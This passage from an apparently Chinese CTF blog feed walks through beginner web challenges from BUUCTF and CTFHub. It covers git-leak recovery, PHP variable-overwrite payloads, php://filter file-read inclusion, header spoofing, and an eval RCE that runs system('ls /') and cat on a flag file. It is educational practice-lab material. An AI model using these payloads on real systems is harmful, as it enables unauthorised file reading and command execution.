<p>使用python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>工具进行恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173027155.png"
                      alt="image-20240914173027155"
                ></p>
<blockquote>
<p>python2的<a class="link"   href="https://github.com/gakki429/Git_Extract" >Git_Extract <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是用于恢复.git文件的，有时做到题可能会需要</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914175301365.png"
                      alt="image-20240914175301365"
                ></p>
</blockquote>
<p>恢复后发现只有两个php文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173134132.png"
                      alt="image-20240914173134132"
                ></p>
<p>flag.php文件如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173236648.png"
                      alt="image-20240914173236648"
                ></p>
<p>index.php文件如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173229008.png"
                      alt="image-20240914173229008"
                ></p>
<p>显然要进行代码审计</p>
<blockquote>
<p>这个东西真的是需要自己去慢慢看的，慢慢看才能学到东西，主要涉及的就是可变变量，先手建议先了解即可，跟着看看做做，见多了自然就悟了</p>
</blockquote>
<p>遇到if比较多的情况优先看关键字，最后有<code>$flag</code>，再往前看到有<code>$yds</code>是与flag有关的，再往前可以看到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914173526537.png"
                      alt="image-20240914173526537"
                ></p>
<p>这里就可以通过GET传递</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://CTF/?yds=flag</span><br></pre></td></tr></table></figure></div>

<p>此时<code>$x=yds,$y=flag</code>，再有源码里面的<code>$$x=$$y</code>，把<code>$yds=$flag</code>，将<code>$flag</code>的值赋值给了<code>$yds</code>，当遇到<code>exit()</code>函数的时候就会输出flag值了</p>
<p>所以在传入参数的时候，将<code>yds=flag</code>传入即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914174420469.png"
                      alt="image-20240914174420469"
                ></p>
<p>最后通过查看源代码，成功得到了flag</p>
<h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>给出3种本人做出来的答案，第一种答案已讲解，其余答案的详解可以看其他博主的<a class="link"   href="https://www.cnblogs.com/Nestar/p/15922456.html" >链接在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，再自己推到一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:yds=flag</span><br><span class="line"></span><br><span class="line">payload2:handsome=flag&amp;flag=handsome</span><br><span class="line"></span><br><span class="line">payload3:flag=flag&amp;ls=flag</span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题有不小难度，在于对php函数的理解和php变量覆盖的领悟，关于这道题总共有4种解法，本人最开始也是看不懂，这里就写了本人根据书上看懂的3种解法，更多的解法和详解可以在其他博主博客里面看到<a class="link"   href="https://www.cnblogs.com/Nestar/p/15922456.html" >链接在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以自己去看看，我就不搬过来了</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 ZJCTF，不过如此*</title>
    <url>/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此*"></a>[BJDCTF2020]ZJCTF，不过如此*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，这里直接给出了源码，接下来要做的第一步就是代码审计≡(▔﹏▔)≡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914183912618.png"
                      alt="image-20240914183912618"
                ></p>
<p>根据源码(..•˘_˘•..)</p>
<p>第一个if说明我们需要传入<code>text=I have a dream</code>才能进行下面的操作</p>
<p>下面一个if说明要传入一个<code>file</code>参数，不能传入flag字符防止直接拿到flag</p>
<p>后面可以看到有<code>include($file)</code>，并且后面加上了注释<code>next.php</code>，表明需要用php伪协议来包含文件，而文件基本就是<code>next.php</code></p>
<p>那具体怎么做呢？(•ิ_•ิ) </p>
<p>这里提供两种方法，一种是<code>data</code>伪协议，另一种是<code>php://input</code></p>
<blockquote>
<p>目前只提供如何提取出文件next.php，后续的涉及其他知识暂且放着，留个坑</p>
</blockquote>
<h3 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h3><p>在<strong>BurpSuite</strong>里面，加上payload：<code>?text=data:text/plain,I have a dream</code></p>
<p>解第一步if不一样之外，其他后面的内容都一样，这里就不重复了，接着往下看吧</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>在<strong>BurpSuite</strong>里面，用<code>php://input</code>传入<code>I have a dream</code>给<code>text</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220642475.png"
                      alt="image-20240914220642475"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220604923.png"
                      alt="image-20240914220604923"
                ></p>
<p>这里只是完成了第一层if判断</p>
<p>接下来，对于要读取文件file参数，则传入<code>php://filter/read=convert.Base64-encode/resource=next.php</code>。</p>
<p>解释一下这串payload</p>
<ul>
<li>使用的是php的filter协议，用于数据过滤</li>
<li>read后面跟上需要使用的过滤器，而这里的过滤器就是<code>convert.Base64-encode</code>，表明调用Base64过滤器对文件内容进行编码再输出</li>
<li>resource后面接输入的文件，文件会被读取然后以Base64的形式输出</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221239456.png"
                      alt="image-20240914221239456"
                ></p>
<p>然后在改包的里面完成操作，读取next.php文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914220915984.png"
                      alt="image-20240914220915984"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221658927.png"
                      alt="image-20240914221658927"
                ></p>
<p>取出这串字符，用Base64解码即可得到next.php文件，提供一个在线解码工具<a class="link"   href="https://www.toolhelper.cn/EncodeDecode/Base64" >锤子 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221848920.png"
                      alt="image-20240914221848920"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/image-20240914221833561.png"
                      alt="image-20240914221833561"
                ></p>
<blockquote>
<p>之后的代码审计暂时不做，留个坑在这</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里需要掌握php的文件包含的知识，如果觉得自己不够掌握的推荐看一下<a class="link"   href="https://blog.csdn.net/qq_38154820/article/details/105839776" >PHP文件包含漏洞利用思路与Bypass总结手册 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这里面基本涵盖了所有的情况，耐心阅读吧~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>待填坑</tag>
        <tag>writeup</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战2019 Http</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>开启靶场后，打开是一个普通页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912182741453.png"
                      alt="image-20240912182741453"
                ></p>
<p>上下翻找没有其他可利用的，直接上F12大法（或者crtl+U查看网页源代码）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183001262.png"
                      alt="image-20240912183001262"
                ></p>
<p>这里我是直接查看源代码，找到需要的<code>Secret.php</code>文件</p>
<blockquote>
<p>但有一个坑，这里需要左右拖动才能看到我们需要的</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183130513.png"
                      alt="image-20240912183130513"
                ></p>
<p>点击后可以看到需要从指定的网页<code>https://Sycsecret.buuoj.cn</code>打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912183337334.png"
                      alt="image-20240912183337334"
                ></p>
<p>根据题目来看也是一个HTTP改包，可以通过<code>BurpSuite</code>来抓包（工具不限）</p>
<p>根据提示抓包后，添加<code>Referer:https://Sycsecret.buuoj.cn</code>伪造访问来源</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184441621.png"
                      alt="image-20240912184441621"
                ></p>
<p>Forward后看到还需要我们用<code>&quot;Syclover&quot;</code>浏览器，要有耐心，继续改包吧&#x3D;_&#x3D;，这次需要修改<code>User-Agent</code>来伪造访问，User-Agent协议表示的是用户访问的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184518595.png"
                      alt="image-20240912184518595"
                ></p>
<p>修改的位置随便，甚至可以把整个User-Agent删空再加一个Syclover，记得带上上一步修改的Referer协议</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184844862.png"
                      alt="image-20240912184844862"
                ></p>
<p>然后会得到让我们用本地访问（127.0.0.1），可以添加<code>X-Forwarded-For:127.0.0.1</code>，也可以添加<code>X-Client</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912184941281.png"
                      alt="image-20240912184941281"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912185221699.png"
                      alt="image-20240912185221699"
                ></p>
<p>加上后再次返回，经过3次修改包，我们成功得到了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp/image-20240912185234356.png"
                      alt="image-20240912185234356"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇算是新手入门级别，成功水了一篇~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>web入门-粗心的小李</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/</url>
    <content><![CDATA[<h1 id="web入门-粗心的小李"><a href="#web入门-粗心的小李" class="headerlink" title="[web入门]粗心的小李"></a>[web入门]粗心的小李</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场看到是Git泄露，首先就是检测再还原找flag</p>
<p>会用到工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和python3的<a class="link"   href="https://github.com/lijiejie/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，需要提前准备，别问为什么两个都要下，接下来你就知道了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913013606873.png"
                      alt="image-20240913013606873"
                ></p>
<p>检测可以通过加&#x2F;.git&#x2F;，若返回是403则说明有可能存在源码泄露；或者通过目录扫描工具检测</p>
<p>检测出存在可能后使用工具python2的<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行恢复</p>
<p>需要用到python2，建议直接kali，kali自带有python2和很多库</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014316448.png"
                      alt="image-20240913014316448"
                ></p>
<p>执行后会多出一些文件，既然.git都出来了，那就好说了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913014504812.png"
                      alt="image-20240913014504812"
                ></p>
<p>但其实这里是没有我们需要的flag的</p>
<p>对没错，又是一个坑，我的另一篇<a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">writeup</a>中，用的这个python2环境才能实现，而这道题要用python3环境的githack，所以之后还是两个都走一遍吧，谁知道呢</p>
<p>当我们用python3环境的githack时，目录中就有一些可以看得到的文件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015133582.png"
                      alt="image-20240913015133582"
                ></p>
<p>进去看看，哦，一看我们的flag就出来了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/image-20240913015202941.png"
                      alt="image-20240913015202941"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于文件使用后却和想要的结果完全不一样的时候，考虑一下版本问题以及查找资料，不要死磕（你又不是高手，啥都磕对身体不好๑乛◡乛๑）</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全WP目录</title>
    <url>/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
<p><a href="#ctfhub">ctfhub</a></p>
<p><a href="#buuctf">buuctf</a></p>
<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><ol>
<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a></li>
<li><a href="/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/" title="RCE-eval执行">RCE-eval执行</a></li>
<li><a href="/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/" title="web前置技能-HTTP协议">web前置技能-HTTP协议</a></li>
</ol>
<h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><ol>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DHttp/" title="极客大挑战2019 Http">[极客大挑战 2019]Http</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/" title="BUU BURP COURSE 1">BUU-BURP-COURSE-1</a></li>
<li><a href="/2024/09/12/ctf/writeup/web/buuctf/%5Bweb%E5%85%A5%E9%97%A8%5D%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E/" title="web入门-粗心的小李">[web入门]粗心的小李</a></li>
<li><a href="/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/" title="BJDCTF2020-Mark-loves-cat*">[BJDCTF2020]Mark-loves-cat</a></li>
<li><a href="/2024/09/14/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DZJCTF-%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" title="BJDCTF2020 ZJCTF，不过如此*">[BJDCTF2020]ZJCTF-不过如此</a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>catalogue</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE-eval执行</title>
    <url>/2024/09/14/ctf/writeup/web/ctfhub/RCE-eval%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="RCE-eval执行"><a href="#RCE-eval执行" class="headerlink" title="RCE-eval执行"></a>RCE-eval执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场之前，题目的名字是<code>eval执行</code>，直接冲着eval执行漏洞去挖</p>
<p>打开靶场，直接漏出源码，审计一下发现需要我们传入参数<code>cmd</code>，然后它会直接执行我们传入的参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224547586.png"
                      alt="image-20240914224547586"
                ></p>
<p>直接传入system函数进行cmd命令输出</p>
<p>查看目录文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>记得要在命令末尾加上;</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914224936330.png"
                      alt="image-20240914224936330"
                ></p>
<p>发现目录下面有<code>flag_27537</code>这样的文件，打开看看</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;cat /flag_27537&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/RCE-eval%E6%89%A7%E8%A1%8C/image-20240914225035612.png"
                      alt="image-20240914225035612"
                ></p>
<p>好家伙flag直接出来了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以看到eval执行的恐怖了吧，直接对服务器进行命令行操作，自己有项目时一定要慎用，要用也要做好防范措施</p>
<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;RCE-&gt;eval执行</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>ctfhub</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>web前置技能-HTTP协议</title>
    <url>/2024/09/15/ctf/writeup/web/ctfhub/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="web前置技能-HTTP协议"><a href="#web前置技能-HTTP协议" class="headerlink" title="web前置技能-HTTP协议"></a>web前置技能-HTTP协议</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-web前置技能-http协议"><ul class="nav-tabs"><li class="tab active"><a class="#web前置技能-http协议-1">题目-请求方式</a></li><li class="tab"><a class="#web前置技能-http协议-2">题目-302跳转</a></li><li class="tab"><a class="#web前置技能-http协议-3">题目-Cookie</a></li><li class="tab"><a class="#web前置技能-http协议-4">题目-基础认证</a></li><li class="tab"><a class="#web前置技能-http协议-5">题目-响应包源代码</a></li></ul><div class="tab-content"><div class="tab-pane active" id="web前置技能-http协议-1"><h3 id="题目-请求方式"><a href="#题目-请求方式" class="headerlink" title="题目-请求方式"></a>题目-请求方式</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源</p>

  </div>

<p>打开靶场，根据题目需要入手的是HTTP的请求方式</p>
<p>看到网页上显示HTTP的提交方式是<code>CTFHUB</code>就会给我们flag，然后下面一行提示表示需要用<code>index.php</code>请求</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202012505.png"
                      alt="image-20240915202012505"
                ></p>
<p>因为原页面就是<code>index.php</code>请求，所以直接抓包即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915202702082.png"
                      alt="image-20240915202702082"
                ></p>
<p>然后<code>GET</code>改为<code>CTFHUB</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203925037.png"
                      alt="image-20240915203925037"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915203939085.png"
                      alt="image-20240915203939085"
                ></p>
<p>这样flag就直接出来了，确实是前置技能哈哈哈(ฅ´ω&#96;ฅ) </p></div><div class="tab-pane" id="web前置技能-http协议-2"><h3 id="题目-302跳转"><a href="#题目-302跳转" class="headerlink" title="题目-302跳转"></a>题目-302跳转</h3>  <div class="note p-4 mb-4 rounded-small info">
    <p>HTTP临时重定向</p>

  </div>

<p>题目中提示需要用到302临时重定向跳转</p>
<blockquote>
<p>在HTTP协议中，302 Found是一种临时重定向状态码，它表示请求的资源已经被临时移动到了由Location头部给出的URL。这个URL可能是新的位置，也可能是请求的资源的另一个版本。这个状态码的主要目的是将用户的请求重定向到新的URL，以便他们能够获得完整的资源。</p>
</blockquote>
<p>打开靶场，点击<code>Give me Flag</code>会发现一直只跳转到本网页，就说明确实需要配合重定向来结解题</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915204346059.png"
                      alt="image-20240915204346059"
                ></p>
<p>先用F12（ctrl+U）大法看看网页源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205115281.png"
                      alt="image-20240915205115281"
                ></p>
<p>看到链接应该是<code>Index.php</code>，但每次点击都只会跳转到<code>index.html</code>，只需要临时抓包不放包就可以防止网页302</p>
<p>点击链接，我们用BP抓包，再发送给repeater（可以理解为发送包后又临时抓包但不返回到浏览器页面的功能）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD-HTTP%E5%8D%8F%E8%AE%AE/image-20240915205435134.png"
                      alt="image-20240915205435134"
                ></p>
